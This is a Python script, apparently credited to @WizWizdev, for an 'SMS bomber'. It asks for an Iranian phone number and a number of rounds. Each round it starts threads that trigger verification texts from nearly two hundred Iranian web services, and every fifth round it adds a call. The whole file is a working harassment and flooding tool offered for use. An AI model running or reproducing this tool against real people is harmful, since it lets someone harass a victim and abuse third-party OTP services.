from threading import Thread
from Api import sms, call
from time import sleep
from sys import exit
from os import system, name
from inspect import getmembers, isfunction 
from random import choice
import pyfiglet
from sys import stdout

def printLow(Str):
    for char in Str:
        print(char, end='', flush=True)
        sleep(0.01)

sms_c = len(getmembers(sms, isfunction))
call_c = len(getmembers(call, isfunction))

def bombing(phone , xx):
    phone = f"+98{phone[1::]}"
    count = 1
    while count <= xx:
        Thread(target=sms.a4baz, args=[phone]).start()        
        Thread(target=sms.gharar, args=[phone]).start()
        Thread(target=sms.abantether, args=[phone]).start()
        Thread(target=sms.achar, args=[phone]).start()
        Thread(target=sms.alibaba, args=[phone]).start()
        Thread(target=sms.alinance, args=[phone]).start()
        Thread(target=sms.alopeyk, args=[phone]).start()
        Thread(target=sms.alopeyk_safir, args=[phone]).start()
        Thread(target=sms.amoomilad, args=[phone]).start()
        Thread(target=sms.anar, args=[phone]).start()
        Thread(target=sms.arka, args=[phone]).start()
        Thread(target=sms.arshiyan, args=[phone]).start()
        Thread(target=sms.ashraafi, args=[phone]).start()
        Thread(target=sms.azki, args=[phone]).start()
        Thread(target=sms.bahram_shop, args=[phone]).start()
        Thread(target=sms.balad, args=[phone]).start()
        Thread(target=sms.bama, args=[phone]).start()
        Thread(target=sms.banankala, args=[phone]).start()
        Thread(target=sms.bandarazad, args=[phone]).start()
        Thread(target=sms.banimode, args=[phone]).start()
        Thread(target=sms.basalam, args=[phone]).start()
        Thread(target=sms.baskol, args=[phone]).start()
        Thread(target=sms.bazidone, args=[phone]).start()
        Thread(target=sms.beheshticarpet, args=[phone]).start()
        Thread(target=sms.bigtoys, args=[phone]).start()
        Thread(target=sms.bimito, args=[phone]).start()
        Thread(target=sms.binjo, args=[phone]).start()
        Thread(target=sms.bit24, args=[phone]).start()
        Thread(target=sms.bitex24, args=[phone]).start()
        Thread(target=sms.candoosms, args=[phone]).start()
        Thread(target=sms.chamedoon, args=[phone]).start()
        Thread(target=sms.chaymarket, args=[phone]).start()
        Thread(target=sms.cinematicket, args=[phone]).start()
        Thread(target=sms.coffefastfoodluxury, args=[phone]).start()
        Thread(target=sms.dadhesab, args=[phone]).start()
        Thread(target=sms.dadpardaz, args=[phone]).start()
        Thread(target=sms.dastkhat, args=[phone]).start()
        Thread(target=sms.delino, args=[phone]).start()
        Thread(target=sms.devslop, args=[phone]).start()
        Thread(target=sms.deyfriedchicken, args=[phone]).start()
        Thread(target=sms.dicardo, args=[phone]).start()
        Thread(target=sms.didnegar, args=[phone]).start()
        Thread(target=sms.digikala, args=[phone]).start()
        Thread(target=sms.digikalajet, args=[phone]).start()
        Thread(target=sms.digipay, args=[phone]).start()
        Thread(target=sms.digistyle, args=[phone]).start()
        Thread(target=sms.divar, args=[phone]).start()
        Thread(target=sms.doctor, args=[phone]).start()
        Thread(target=sms.doctoreto, args=[phone]).start()
        Thread(target=sms.donergarden, args=[phone]).start()
        Thread(target=sms.dosma, args=[phone]).start()
        Thread(target=sms.drdr, args=[phone]).start()
        Thread(target=sms.drsaina, args=[phone]).start()
        Thread(target=sms.ehteraman, args=[phone]).start()
        Thread(target=sms.emtiaz, args=[phone]).start()
        Thread(target=sms.exo, args=[phone]).start()
        Thread(target=sms.express, args=[phone]).start()
        Thread(target=sms.farsgraphic, args=[phone]).start()
        Thread(target=sms.filmnet, args=[phone]).start()
        Thread(target=sms.flightio, args=[phone]).start()
        Thread(target=sms.foodbell, args=[phone]).start()
        Thread(target=sms.foodcenter, args=[phone]).start()
        Thread(target=sms.foodiran16, args=[phone]).start()
        Thread(target=sms.foodlandkish, args=[phone]).start()
        Thread(target=sms.gap, args=[phone]).start()
        Thread(target=sms.gapfilm, args=[phone]).start()
        Thread(target=sms.garcon, args=[phone]).start()
        Thread(target=sms.gelatohouse, args=[phone]).start()
        Thread(target=sms.ghabzino, args=[phone]).start()
        Thread(target=sms.ghasedak24, args=[phone]).start()
        Thread(target=sms.givernfood, args=[phone]).start()
        Thread(target=sms.glite, args=[phone]).start()
        Thread(target=sms.hamlex, args=[phone]).start()
        Thread(target=sms.hamrahbours, args=[phone]).start()
        Thread(target=sms.helsa, args=[phone]).start()
        Thread(target=sms.hemat, args=[phone]).start()
        Thread(target=sms.hiword, args=[phone]).start()
        Thread(target=sms.homtick, args=[phone]).start()
        Thread(target=sms.hyperjan, args=[phone]).start()
        Thread(target=sms.instagram, args=[phone]).start()
        Thread(target=sms.iranamlaak, args=[phone]).start()
        Thread(target=sms.iranicard, args=[phone]).start()
        Thread(target=sms.iranketab, args=[phone]).start()
        Thread(target=sms.irantic, args=[phone]).start()
        Thread(target=sms.irwco, args=[phone]).start()
        Thread(target=sms.itoll, args=[phone]).start()
        Thread(target=sms.kafegheymat, args=[phone]).start()
        Thread(target=sms.karchidari, args=[phone]).start()
        Thread(target=sms.kardoon, args=[phone]).start()
        Thread(target=sms.ketabchi, args=[phone]).start()
        Thread(target=sms.khanoumi, args=[phone]).start()
        Thread(target=sms.khodro45, args=[phone]).start()
        Thread(target=sms.kilid, args=[phone]).start()
        Thread(target=sms.kodakamoz, args=[phone]).start()
        Thread(target=sms.lendo, args=[phone]).start()
        Thread(target=sms.limome, args=[phone]).start()
        Thread(target=sms.mahiyekhoob, args=[phone]).start()
        Thread(target=sms.mamifood, args=[phone]).start()
        Thread(target=sms.mashinbank, args=[phone]).start()
        Thread(target=sms.mazoo, args=[phone]).start()
        Thread(target=sms.mci, args=[phone]).start()
        Thread(target=sms.mek, args=[phone]).start()
        Thread(target=sms.melix, args=[phone]).start()
        Thread(target=sms.miare, args=[phone]).start()
        Thread(target=sms.mihanpezeshk, args=[phone]).start()
        Thread(target=sms.mipersia, args=[phone]).start()
        Thread(target=sms.mobogift, args=[phone]).start()
        Thread(target=sms.moshaveran724, args=[phone]).start()
        Thread(target=sms.namava, args=[phone]).start()
        Thread(target=sms.nesengrill, args=[phone]).start()
        Thread(target=sms.nobat, args=[phone]).start()
        Thread(target=sms.novinbook, args=[phone]).start()
        Thread(target=sms.offch, args=[phone]).start()
        Thread(target=sms.offdecor, args=[phone]).start()
        Thread(target=sms.okcs, args=[phone]).start()
        Thread(target=sms.okorosh, args=[phone]).start()
        Thread(target=sms.olgoo, args=[phone]).start()
        Thread(target=sms.opco, args=[phone]).start()
        Thread(target=sms.ostadkr, args=[phone]).start()
        Thread(target=sms.otaghak, args=[phone]).start()
        Thread(target=sms.pakhsh, args=[phone]).start()
        Thread(target=sms.paklean, args=[phone]).start()
        Thread(target=sms.paymishe, args=[phone]).start()
        Thread(target=sms.pezeshket, args=[phone]).start()
        Thread(target=sms.pinket, args=[phone]).start()
        Thread(target=sms.pirankalaco, args=[phone]).start()
        Thread(target=sms.pizzapanjereh, args=[phone]).start()
        Thread(target=sms.podro, args=[phone]).start()
        Thread(target=sms.pubgsell, args=[phone]).start()
        Thread(target=sms.pubisha, args=[phone]).start()
        Thread(target=sms.raminashop, args=[phone]).start()
        Thread(target=sms.rayshomar, args=[phone]).start()
        Thread(target=sms.refahtea, args=[phone]).start()
        Thread(target=sms.rojashop, args=[phone]).start()
        Thread(target=sms.rokla, args=[phone]).start()
        Thread(target=sms.rubika, args=[phone]).start()
        Thread(target=sms.sTrip, args=[phone]).start()
        Thread(target=sms.sabziman, args=[phone]).start()
        Thread(target=sms.safiran, args=[phone]).start()
        Thread(target=sms.see5, args=[phone]).start()
        Thread(target=sms.seebirani, args=[phone]).start()
        Thread(target=sms.shab, args=[phone]).start()
        Thread(target=sms.shad, args=[phone]).start()
        Thread(target=sms.shahrfarsh, args=[phone]).start()
        Thread(target=sms.shahrhayejadid, args=[phone]).start()
        Thread(target=sms.shandiz, args=[phone]).start()
        Thread(target=sms.sheypoor, args=[phone]).start()
        Thread(target=sms.shop_mci, args=[phone]).start()
        Thread(target=sms.sibbank, args=[phone]).start()
        Thread(target=sms.sibbazar, args=[phone]).start()
        Thread(target=sms.simkhanF, args=[phone]).start()
        Thread(target=sms.simkhanT, args=[phone]).start()
        Thread(target=sms.sizdah50, args=[phone]).start()
        Thread(target=sms.smarket, args=[phone]).start()
        Thread(target=sms.snap, args=[phone]).start()
        Thread(target=sms.snapfood, args=[phone]).start()
        Thread(target=sms.snapp, args=[phone]).start()
        Thread(target=sms.snapp_drivers, args=[phone]).start()
        Thread(target=sms.snapp_link, args=[phone]).start()
        Thread(target=sms.steelalborz, args=[phone]).start()
        Thread(target=sms.taghche, args=[phone]).start()
        Thread(target=sms.tajtehran, args=[phone]).start()
        Thread(target=sms.takfarsh, args=[phone]).start()
        Thread(target=sms.tamland, args=[phone]).start()
        Thread(target=sms.tap30, args=[phone]).start()
        Thread(target=sms.tapsi, args=[phone]).start()
        Thread(target=sms.tikban, args=[phone]).start()
        Thread(target=sms.timcheh, args=[phone]).start()
        Thread(target=sms.tj8, args=[phone]).start()
        Thread(target=sms.tmg, args=[phone]).start()
        Thread(target=sms.tnovin, args=[phone]).start()
        Thread(target=sms.topnoor, args=[phone]).start()
        Thread(target=sms.torob, args=[phone]).start()
        Thread(target=sms.uphone, args=[phone]).start()
        Thread(target=sms.virgool, args=[phone]).start()
        Thread(target=sms.watchonline, args=[phone]).start()
        Thread(target=sms.wis, args=[phone]).start()
        Thread(target=sms.zerocafe, args=[phone]).start()
        Thread(target=sms.zivanpet, args=[phone]).start()
        print(f"\033[1m\033[96mRound \033[1;31m{count} \033[1m\033[96mCompleted")
        if (count % 5) == 0:
           rnd_call = choice([call.ragham_call,call.paklean_call,call.novinbook_call,call.azki_call])
           Thread(target=rnd_call, args=[phone]).start()
        count += 1
        sleep(0.2)
    printLow(f"\033[32;1m[\033[1;33mFinished\033[32;1m]")
    exit()


if __name__ == "__main__":
    # printLow(f"""\033[32;1m[+] \033[1;33msms api's: \033[32;1m{sms_c}\n\033[32;1m[+] \033[1;33mcall api's: \033[32;1m{call_c}""")
    print("")
    letters =  pyfiglet.figlet_format('sms bomber')
    for char in letters:
            # stdout.write(char)
            # stdout.flush()
            # sleep(0.0001/0.01)	
            str = f""" \033[32;1m[*] \033[1;33msms: \033[32;1mon \n"""    
    for char in str:
            stdout.write(char)
            stdout.flush()
            sleep(0.001/0.02)
            str = f""" \033[32;1m[*] \033[1;33mcall: \033[32;1mon \n"""    
    for char in str:
            stdout.write(char)
            stdout.flush()
            sleep(0.001/0.02)
            str = f""" \033[32;1m[*] \033[1;33msend code: \033[32;1mon \n"""    
    for char in str:
            stdout.write(char)
            stdout.flush()
            sleep(0.001/0.02)
            str = f""" \033[32;1m[*] \033[1;33mnumber: \033[32;1mon \n"""    
    for char in str:
            stdout.write(char)
            stdout.flush()
            sleep(0.001/0.02)
    print("")
    print("")
    def banner():
        print ('\t         \033[1;34m   ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇         ')
        print('\t         \033[1;34m   ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇       ')
        print ('\t         \033[1;34m   ▇▇▇▏▃▆▅▎▅▆▃▕▇▇▇          ')
        print ('\t         \033[1;34m   ▇▇▇▏╱▔▕▎▔▔╲▕▇▇▇           ')
        print ('\t         \033[1;34m   ▇▇▇◣◣▃▅▎▅▃◢◢▇▇▇\033[2;32m  Code By :\033[2;31m @WizWizdev')
        print ('\t         \033[1;34m   ▇▇▇▇◣◥▅▅▅◤◢▇▇▇▇             ')
        print ('\t         \033[1;34m   ▇▇▇▇▇◣╲▇╱◢▇▇▇▇▇      ')
        print ('\t         \033[1;34m   ▇▇▇▇▇▇◣▇◢▇▇▇▇▇▇            ')
    banner()
    print("")
    print("")
    letters =  pyfiglet.figlet_format('sms bomber')
    for char in letters:
            stdout.write(char)
            stdout.flush()
            sleep(0.0001/0.01)	
            str = f""" \033[1;36m WELCOME TO SMS BOMBER """    
    for char in str:
            stdout.write(char)
            stdout.flush()
            sleep(0.001/0.02)

    num = input(f'\n\n\033[32;1m[(*)] \033[1m\033[96mEnter Phone Number\n\033[1;33m  Ex:09190000000\n \033[1;31m-> \033[32;1m')
    yy = int(input("\n\033[32;1m[+] \033[1;33mEnter The Count of Round of Bombing\n\033[1;31m-> \033[32;1m"))
    system('clear' if name == 'posix' else 'cls')
    printLow("\033[32;1m[+]\033[1;33m Phone Number:\033[1m\033[96m {}\n\033[32;1m[+]\033[1;33m Rounds:\033[1m\033[96m {}\n\n".format(num,yy))
    printLow(f"\033[32;1m[\033[1;31mStart\033[32;1m]\n")
    bombing(phone=num,xx=yy)
